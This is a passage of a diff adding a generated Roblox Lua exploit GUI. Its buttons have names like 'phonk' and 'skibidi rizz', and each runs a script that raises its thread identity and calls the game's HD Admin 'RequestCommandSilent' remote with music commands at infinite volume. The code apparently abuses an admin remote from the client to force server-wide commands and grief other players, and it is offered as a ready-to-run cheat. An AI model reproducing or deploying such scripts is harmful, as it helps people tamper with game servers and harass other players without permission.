+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 1843497734 ;pitch 0.6 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_106"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_107"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_107"].Name = "TextButton"
+HTT03["TextButton_107"].Visible = true
+HTT03["TextButton_107"].ZIndex = 1
+HTT03["TextButton_107"].LayoutOrder = 0
+HTT03["TextButton_107"].Position = UDim2.new(0.000000,367,0.000000,794)
+HTT03["TextButton_107"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_107"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_107"].Rotation = 0
+HTT03["TextButton_107"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_107"].BackgroundTransparency = 0
+HTT03["TextButton_107"].BorderSizePixel = 3
+HTT03["TextButton_107"].BorderColor3 = Color3.fromRGB(17,0,255)
+HTT03["TextButton_107"].ClipsDescendants = false
+HTT03["TextButton_107"].Active = true
+HTT03["TextButton_107"].Selectable = true
+HTT03["TextButton_107"].AutoButtonColor = true
+HTT03["TextButton_107"].Modal = false
+HTT03["TextButton_107"].Text = "idolt"
+HTT03["TextButton_107"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_107"].TextSize = 10
+HTT03["TextButton_107"].TextTransparency = 0
+HTT03["TextButton_107"].TextScaled = false
+HTT03["TextButton_107"].TextWrapped = false
+HTT03["TextButton_107"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_107"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_107"].Font = Enum.Font.Legacy
+HTT03["TextButton_107"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_107"].TextStrokeTransparency = 1
+HTT03["TextButton_107"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_108"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_107"])
+HTT03["UIAspectRatioConstraint_108"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_109"] = Instance.new("LocalScript")
+HTT03["LocalScript_109"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_109"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent	
+              RequestCommand:InvokeServer(";music 3200130016 ;pitch 1 ;volume inf")	
+end)]==]
+    end)
+    HTT03["LocalScript_109"].Parent = HTT03["TextButton_107"]
+    if HTT03["LocalScript_109"]:IsA("BaseScript") then HTT03["LocalScript_109"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent	
+              RequestCommand:InvokeServer(";music 3200130016 ;pitch 1 ;volume inf")	
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent	
+              RequestCommand:InvokeServer(";music 3200130016 ;pitch 1 ;volume inf")	
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_109"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_110"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_110"].Name = "TextButton"
+HTT03["TextButton_110"].Visible = true
+HTT03["TextButton_110"].ZIndex = 1
+HTT03["TextButton_110"].LayoutOrder = 0
+HTT03["TextButton_110"].Position = UDim2.new(0.000000,27,0.000000,865)
+HTT03["TextButton_110"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_110"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_110"].Rotation = 0
+HTT03["TextButton_110"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_110"].BackgroundTransparency = 0
+HTT03["TextButton_110"].BorderSizePixel = 3
+HTT03["TextButton_110"].BorderColor3 = Color3.fromRGB(0,49,255)
+HTT03["TextButton_110"].ClipsDescendants = false
+HTT03["TextButton_110"].Active = true
+HTT03["TextButton_110"].Selectable = true
+HTT03["TextButton_110"].AutoButtonColor = true
+HTT03["TextButton_110"].Modal = false
+HTT03["TextButton_110"].Text = "gangsta remix"
+HTT03["TextButton_110"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_110"].TextSize = 10
+HTT03["TextButton_110"].TextTransparency = 0
+HTT03["TextButton_110"].TextScaled = false
+HTT03["TextButton_110"].TextWrapped = false
+HTT03["TextButton_110"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_110"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_110"].Font = Enum.Font.Legacy
+HTT03["TextButton_110"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_110"].TextStrokeTransparency = 1
+HTT03["TextButton_110"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_111"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_110"])
+HTT03["UIAspectRatioConstraint_111"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_112"] = Instance.new("LocalScript")
+HTT03["LocalScript_112"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_112"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent	
+              RequestCommand:InvokeServer(";music 5228173823 ;pitch 1 ;volume inf")	
+end)]==]
+    end)
+    HTT03["LocalScript_112"].Parent = HTT03["TextButton_110"]
+    if HTT03["LocalScript_112"]:IsA("BaseScript") then HTT03["LocalScript_112"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent	
+              RequestCommand:InvokeServer(";music 5228173823 ;pitch 1 ;volume inf")	
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent	
+              RequestCommand:InvokeServer(";music 5228173823 ;pitch 1 ;volume inf")	
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_112"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_113"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_113"].Name = "TextButton"
+HTT03["TextButton_113"].Visible = true
+HTT03["TextButton_113"].ZIndex = 1
+HTT03["TextButton_113"].LayoutOrder = 0
+HTT03["TextButton_113"].Position = UDim2.new(0.000000,197,0.000000,862)
+HTT03["TextButton_113"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_113"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_113"].Rotation = 0
+HTT03["TextButton_113"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_113"].BackgroundTransparency = 0
+HTT03["TextButton_113"].BorderSizePixel = 3
+HTT03["TextButton_113"].BorderColor3 = Color3.fromRGB(76,0,255)
+HTT03["TextButton_113"].ClipsDescendants = false
+HTT03["TextButton_113"].Active = true
+HTT03["TextButton_113"].Selectable = true
+HTT03["TextButton_113"].AutoButtonColor = true
+HTT03["TextButton_113"].Modal = false
+HTT03["TextButton_113"].Text = "phonk"
+HTT03["TextButton_113"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_113"].TextSize = 10
+HTT03["TextButton_113"].TextTransparency = 0
+HTT03["TextButton_113"].TextScaled = false
+HTT03["TextButton_113"].TextWrapped = false
+HTT03["TextButton_113"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_113"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_113"].Font = Enum.Font.Legacy
+HTT03["TextButton_113"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_113"].TextStrokeTransparency = 1
+HTT03["TextButton_113"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_114"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_113"])
+HTT03["UIAspectRatioConstraint_114"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_115"] = Instance.new("LocalScript")
+HTT03["LocalScript_115"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_115"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 15689453529 ;pitch 1 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_115"].Parent = HTT03["TextButton_113"]
+    if HTT03["LocalScript_115"]:IsA("BaseScript") then HTT03["LocalScript_115"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 15689453529 ;pitch 1 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 15689453529 ;pitch 1 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_115"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_116"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_116"].Name = "TextButton"
+HTT03["TextButton_116"].Visible = true
+HTT03["TextButton_116"].ZIndex = 1
+HTT03["TextButton_116"].LayoutOrder = 0
+HTT03["TextButton_116"].Position = UDim2.new(0.000000,366,0.000000,862)
+HTT03["TextButton_116"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_116"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_116"].Rotation = 0
+HTT03["TextButton_116"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_116"].BackgroundTransparency = 0
+HTT03["TextButton_116"].BorderSizePixel = 3
+HTT03["TextButton_116"].BorderColor3 = Color3.fromRGB(41,0,255)
+HTT03["TextButton_116"].ClipsDescendants = false
+HTT03["TextButton_116"].Active = true
+HTT03["TextButton_116"].Selectable = true
+HTT03["TextButton_116"].AutoButtonColor = true
+HTT03["TextButton_116"].Modal = false
+HTT03["TextButton_116"].Text = "skibidi rizz"
+HTT03["TextButton_116"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_116"].TextSize = 10
+HTT03["TextButton_116"].TextTransparency = 0
+HTT03["TextButton_116"].TextScaled = false
+HTT03["TextButton_116"].TextWrapped = false
+HTT03["TextButton_116"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_116"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_116"].Font = Enum.Font.Legacy
+HTT03["TextButton_116"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_116"].TextStrokeTransparency = 1
+HTT03["TextButton_116"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_117"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_116"])
+HTT03["UIAspectRatioConstraint_117"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_118"] = Instance.new("LocalScript")
+HTT03["LocalScript_118"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_118"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 16190757458 ;pitch 1 ;volume inf")
+end)]==]
+    end)
+    HTT03["LocalScript_118"].Parent = HTT03["TextButton_116"]
+    if HTT03["LocalScript_118"]:IsA("BaseScript") then HTT03["LocalScript_118"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 16190757458 ;pitch 1 ;volume inf")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+              local ReplicatedStorage = game:GetService("ReplicatedStorage")
+              local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+              RequestCommand:InvokeServer(";music 16190757458 ;pitch 1 ;volume inf")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_118"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- LocalScript "LocalScript"
+HTT03["LocalScript_119"] = Instance.new("LocalScript")
+HTT03["LocalScript_119"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_119"].Source = [==[local Gui = script.Parent
+local Frame = Gui:WaitForChild("Frame")
+local Button = Gui:WaitForChild("TextButton")
+
+Button.MouseButton1Up:Connect(function()
+	Frame.Visible = not Frame.Visible
+end)
+]==]
+    end)
+    HTT03["LocalScript_119"].Parent = HTT03["ScreenGui_1"]
+    if HTT03["LocalScript_119"]:IsA("BaseScript") then HTT03["LocalScript_119"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local Gui = script.Parent
+local Frame = Gui:WaitForChild("Frame")
+local Button = Gui:WaitForChild("TextButton")
+
+Button.MouseButton1Up:Connect(function()
+	Frame.Visible = not Frame.Visible
+end)
+]==]) or load([==[local Gui = script.Parent
+local Frame = Gui:WaitForChild("Frame")
+local Button = Gui:WaitForChild("TextButton")
+
+Button.MouseButton1Up:Connect(function()
+	Frame.Visible = not Frame.Visible
+end)
+]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_119"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+if #_rbFuncs > 0 then RunService.Heartbeat:Connect(function(dt) for _, fn in ipairs(_rbFuncs) do pcall(fn, dt) end end) end
+return HTT03["ScreenGui_1"]
